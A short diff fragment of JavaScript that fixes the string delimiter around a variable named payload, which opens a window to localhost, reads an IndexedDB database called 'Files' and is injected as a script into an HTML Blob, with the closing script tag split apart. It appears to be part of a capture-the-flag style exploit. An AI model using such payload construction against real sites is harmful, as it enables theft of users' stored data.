@@ -7,7 +7,7 @@
 
       let x = window.open("http://localhost:1338");
 
-      let payload = ```
+      let payload = `
       (async () => {
           const request = indexedDB.open("Files", 1);
           request.onsuccess = async () => {
@@ -35,7 +35,7 @@
               };
           };
       })();
-```
+`
 
     
       let blob = new Blob([`<script>${payload}<` + `/` + `script` + ">"], { type: "text/html" });
